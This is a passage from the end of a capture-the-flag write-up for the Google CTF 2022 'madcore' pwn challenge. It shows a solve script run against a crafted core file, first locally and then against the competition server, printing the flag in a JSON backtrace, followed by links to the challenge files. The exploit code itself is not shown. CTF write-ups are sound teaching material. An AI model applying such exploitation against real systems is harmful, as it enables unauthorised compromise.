➜  writeup git:(main) ✗ ./solve.py CORE=crash/core.1001.14162.1657865437
[*] len: 507904
[*] Switching to interactive mode
LLVMSymbolizer: error reading file: No such file or directory
LLVMSymbolizer: error reading file: No such file or directory
{"backtrace":[[0,"<unknown>"],[0,"<unknown>"],[0,"<unknown>"],[0,"<unknown>"],[0,"<unknown>"],[0,"<unknown>"],[0,"<unknown>"],[289,"??\n??:0:0\n\n"],[336,"<unknown>"],[3386829460269511470,"<unknown>"],[3687940315385325932,"<unknown>"],[7596498852877118840,"<unknown>"],[1,"??\n??:0:0\n\nCTF{TEST_FLAG}\n"]],"modules":[]}
[*] Got EOF while reading in interactive
$ 
```
and on remote:
```bash
➜  writeup git:(main) ✗ ./solve.py CORE=crash/core.1001.14162.1657865437 REMOTE
[+] Opening connection to madcore.2022.ctfcompetition.com on port 1337: Done
[*] len: 507904
[*] Switching to interactive mode
{"backtrace":[[0,"<unknown>"],[0,"<unknown>"],[0,"<unknown>"],[0,"<unknown>"],[0,"<unknown>"],[0,"<unknown>"],[0,"<unknown>"],[289,""],[336,"<unknown>"],[3386829460269511470,"<unknown>"],[3687940315385325932,"<unknown>"],[7596498852877118840,"<unknown>"],[1,"CTF{w4y_cpp_g0tta_be_like_that_can_we_get_a_good_STLPLS}\n"]],"modules":[]}
[*] Got EOF while reading in interactive
$  
```

[googlectf]:    https://capturetheflag.withgoogle.com/challenges/pwn-madcore
[madcore_zip]:  https://embe221ed.dev/files/CTFs/GoogleCTF/2022/pwn/madcore/madcore.zip
